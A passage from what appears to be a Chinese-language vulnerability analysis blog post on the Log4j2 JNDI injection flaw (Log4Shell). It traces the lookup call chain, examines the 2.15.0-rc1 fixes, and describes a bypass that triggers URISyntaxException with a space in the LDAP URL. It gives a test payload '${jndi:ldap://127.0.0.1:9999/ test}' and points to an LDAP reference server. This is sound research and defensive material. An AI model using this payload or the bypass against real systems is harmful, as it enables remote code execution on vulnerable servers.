class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224135.png"><br>在strLookupMap中键名为”jndi”的值为JndiLookup对象，进入JndiLookup类的lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">jndiName</span> <span class="operator">=</span> convertJndiName(key);</span><br><span class="line">    <span class="keyword">try</span> (<span class="keyword">final</span> <span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager()) &#123;</span><br><span class="line">        <span class="comment">// 调用jndiManager.lookup(jndiName)方法获取JNDI对象，然后通过toString方法输出</span></span><br><span class="line">        <span class="keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">        LOGGER.warn(LOOKUP, <span class="string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224535.png"><br>进入JndiManager类的lookup方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224747.png"><br>这里的context是InitialContext对象，调用其lookup方法，下面就是JNDI中的链了</p>
<h2 id="代码关键点"><a href="#代码关键点" class="headerlink" title="代码关键点"></a>代码关键点</h2><p>三个关键点：</p>
<ol>
<li>在PatternLayout类的toSerializable方法中，调用MessagePatternConverter的format方法，这个方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}，同时匹配字符串中是否存在${}占位符，并使用config.getStrSubstitutor().replace进行替换</li>
<li>在StrSubstitutor类的substitute方法中，提取${}中的内容，并调用StrSubstitutor类resolveVariable方法对其解析</li>
<li>在Interpolator类的lookup方法中，根据前缀在map中获取对应的StrLookup对象，然后调用其lookup方法，这里的前缀为jndi，所以获取的是JndiLookup对象，然后调用其lookup方法，这个方法调用了jndiManager.lookup方法</li>
</ol>
<h2 id="试试info方法"><a href="#试试info方法" class="headerlink" title="试试info方法"></a>试试info方法</h2><p>在StandardLevel类中定义了日志的级别，数值越低，优先级越高</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StandardLevel</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * No events will be logged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    OFF(<span class="number">0</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A severe error that will prevent the application from continuing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FATAL(<span class="number">100</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An error in the application, possibly recoverable.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ERROR(<span class="number">200</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An event that might possible lead to an error.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    WARN(<span class="number">300</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An event for informational purposes.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    INFO(<span class="number">400</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A general debugging event.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DEBUG(<span class="number">500</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TRACE(<span class="number">600</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * All events should be logged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ALL(Integer.MAX_VALUE);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：<br>首先进入AbstractLogger类的logIfEnabled方法，这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    <span class="comment">// 必须过if判断</span></span><br><span class="line">    <span class="keyword">if</span> (isEnabled(level, marker, message, p0)) &#123;</span><br><span class="line">        logMessage(fqcn, level, marker, message, p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳过中间一步来到Logger类的filter方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116144706.png"><br>很显然返回的是false，从而在logIfEnabled中不会调用logMessage方法</p>
<p>问题：intLevel从哪里来的？<br>这里的intLevel是为200，默认等于ERROR等级，也就是说，<strong>在默认情况下，等级值小于ERROR等级的都会造成RCE</strong></p>
<p>当然这个也能从配置文件中来<br>log4j的默认配置文件如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在将Root的level改为info</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116162949.png"><br>能够成功过这个条件，从而导致RCE<br>至于配置文件的加载来自于LogManager.getLogger(…)，这里不再赘述</p>
<h1 id="log4j-2-15-0-rc1分析"><a href="#log4j-2-15-0-rc1分析" class="headerlink" title="log4j-2.15.0-rc1分析"></a>log4j-2.15.0-rc1分析</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a><br>下载源码进行编译，测试中导入log4j-api-2.15.0和log4j-core-2.15.0即可</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>2.15.0-rc1版本对前面存在的问题进行了修复，主要有以下：<br><strong>第一</strong>：<br>对应前一节代码关键点的第一点，在toSerializable方法处调用的不再是MessagePatternConverter的format方法，而是SimpleMessagePatternConverter的format方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119154921.png"></p>
<p>查看SimpleMessagePatternConverter的format方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">SimpleMessagePatternConverter</span> <span class="keyword">extends</span> <span class="title class_">MessagePatternConverter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">MessagePatternConverter</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMessagePatternConverter</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SimpleMessagePatternConverter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">        <span class="comment">// 直接格式化后结束</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(toAppendTo);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">            toAppendTo.append(msg.getFormattedMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的SimpleMessagePatternConverter中的format方法没有解析”${“，而是将字符格式化后就结束，所以也没有后面的调用步骤</p>
<p>另外，对于MessagePatternConverter类创建了以下四个内部类：</p>
<ul>
<li>SimpleMessagePatternConverter</li>
<li>FormattedMessagePatternConverter</li>
<li>LookupMessagePatternConverter</li>
<li>RenderingPatternConverter</li>
</ul>
<p>默认情况下是会使用SimpleMessagePatternConverter进行处理，但是对于不同配置的情况下会使用对应配置的内部类进行处理</p>
<p>针对于rc1绕过的一点就来自于这里，LookupMessagePatternConverter会对”${“进行处理，而在配置文件中开启lookups就会使用LookupMessagePatternConverter内部类，这里后面会提到。而在这一版本中，lookups默认是不开启的，这也是与之前版本不同的一点</p>
<p><strong>总结下来：第一点更新就是对MessagePatternConverter类进行了处理，并修改了format的逻辑，同时移除了从 Properties 中获取 Lookup 配置的选项，默认不开启lookup功能</strong></p>
<p><strong>第二</strong>：<br>对应前一节代码关键点的第一点，这里在JndiManager类的lookup方法中进行了白名单限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(name);</span><br><span class="line">        <span class="keyword">if</span> (uri.getScheme() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查协议是否在允许的白名单列表</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                LOGGER.warn(<span class="string">&quot;Log4j JNDI does not allow protocol &#123;&#125;&quot;</span>, uri.getScheme());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 检查协议是否是LDAP或LDAPS</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;ldap&quot;</span>.equalsIgnoreCase(uri.getScheme()) || <span class="string">&quot;ldaps&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">                <span class="comment">// 检查主机名是否在允许的白名单列表 allowedHosts中</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedHosts.contains(uri.getHost())) &#123;</span><br><span class="line">                    LOGGER.warn(<span class="string">&quot;Attempt to access ldap server not in allowed list&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 获取指定名称的JNDI属性</span></span><br><span class="line">                <span class="type">Attributes</span> <span class="variable">attributes</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getAttributes(name);</span><br><span class="line">                <span class="keyword">if</span> (attributes != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Map&lt;String, Attribute&gt; attributeMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                    NamingEnumeration&lt;? <span class="keyword">extends</span> <span class="title class_">Attribute</span>&gt; enumeration = attributes.getAll();</span><br><span class="line">                    <span class="comment">// 获取属性的枚举，并将属性及其ID存储到 attributeMap 中</span></span><br><span class="line">                    Attribute classNameAttr;</span><br><span class="line">                    <span class="keyword">while</span>(enumeration.hasMore()) &#123;</span><br><span class="line">                        classNameAttr = (Attribute)enumeration.next();</span><br><span class="line">                        attributeMap.put(classNameAttr.getID(), classNameAttr);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 从 attributeMap 中获取名为 CLASS_NAME 的属性</span></span><br><span class="line">                    classNameAttr = (Attribute)attributeMap.get(<span class="string">&quot;javaClassName&quot;</span>);</span><br><span class="line">                    <span class="comment">// 检查是否存在名为 SERIALIZED_DATA 的属性</span></span><br><span class="line">                    <span class="keyword">if</span> (attributeMap.get(<span class="string">&quot;javaSerializedData&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (classNameAttr == <span class="literal">null</span>) &#123;</span><br><span class="line">                            LOGGER.warn(<span class="string">&quot;No class name provided for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> classNameAttr.get().toString();</span><br><span class="line">                        <span class="comment">// 检查 className 是否在允许的白名单列表 allowedClasses 中</span></span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedClasses.contains(className)) &#123;</span><br><span class="line">                            LOGGER.warn(<span class="string">&quot;Deserialization of &#123;&#125; is not allowed&quot;</span>, className);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// // 如果存在名为 REFERENCE_ADDRESS 或 OBJECT_FACTORY 的属性，则记录警告日志并返回null  </span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (attributeMap.get(<span class="string">&quot;javaReferenceAddress&quot;</span>) != <span class="literal">null</span> || attributeMap.get(<span class="string">&quot;javaFactory&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        LOGGER.warn(<span class="string">&quot;Referenceable class is not allowed for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// // 捕获 URISyntaxException 异常 </span></span><br><span class="line">    <span class="keyword">catch</span> (URISyntaxException var8) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有触发任何警告或异常，执行JNDI查找操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119195600.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119173441.png"></p>
<p>而这里jndiManager对象的构造来自于JndiLookup类中的lookup方法中的如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager();</span><br></pre></td></tr></table></figure>

<p>进入JndiManager类的getDefaultManager</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于JndiManager中没有定义getManager，调用父类AbstractManager的getManager方法，观察下面这句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">manager = (AbstractManager)factory.createManager(name, data);</span><br></pre></td></tr></table></figure>

<p>此时的factory是JndiManagerFactory(JndiManager的内部类)，进入其createManager方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JndiManager <span class="title function_">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">hosts</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedLdapHosts&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">classes</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedLdapClasses&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">protocols</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedJndiProtocols&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    List&lt;String&gt; allowedHosts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;String&gt; allowedClasses = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;String&gt; allowedProtocols = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="comment">// 这里就是加入的白名单操作</span></span><br><span class="line">    <span class="built_in">this</span>.addAll(hosts, allowedHosts, JndiManager.permanentAllowedHosts, <span class="string">&quot;allowedLdapHosts&quot;</span>, data);</span><br><span class="line">    <span class="built_in">this</span>.addAll(classes, allowedClasses, JndiManager.permanentAllowedClasses, <span class="string">&quot;allowedLdapClasses&quot;</span>, data);</span><br><span class="line">    <span class="built_in">this</span>.addAll(protocols, allowedProtocols, JndiManager.permanentAllowedProtocols, <span class="string">&quot;allowedJndiProtocols&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个JndiManager，使用了InitialDirContext</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JndiManager</span>(name, <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(data), allowedHosts, allowedClasses, allowedProtocols);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var10) &#123;</span><br><span class="line">        JndiManager.LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, var10);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结： JndiManager 实例是由JndiManagerFactory来创建的，并且不再使用 InitialContext，而是使用 InitialDirContext。另外，在lookup方法中还加入的白名单逻辑判断</strong></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>针对以上两点改进，同样存在神奇的绕过方式<br><strong>对于第一点</strong>，可以开启lookups功能，让其使用LookupMessagePatternConverter进行处理，这里的lookups默认是不开启的，所以需要手动开启<br>开启方式参考：<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#enabling-message-pattern-lookups">https://logging.apache.org/log4j/2.x/manual/configuration.html#enabling-message-pattern-lookups</a></p>
<p>log4j2配置文件如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;warn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MyApp&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">console</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%msg&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>对于第二点</strong>，在JndiManager类的lookup方法中，最后捕获URISyntaxException异常的catch块没有进行如何处理及返回，这样还是能够执行到代码的最后一行<br>因此，只要触发URISyntaxException异常，就可以绕过，触发漏洞。触发异常的方式是在URL中加入一个空格</p>
<h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RC1Bypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(RC1Bypass.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:9999/ test&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且构建一个LDAP reference服务，监听9999端口，具体代码参考marshalsec：<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
<h2 id="函数调用栈-1"><a href="#函数调用栈-1" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">257</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replaceIn:<span class="number">890</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">186</span>, MessagePatternConverter$LookupMessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">343</span>, PatternLayout$NoFormatPatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">241</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">226</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">60</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">161</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">134</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">125</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">89</span>, AppenderControl 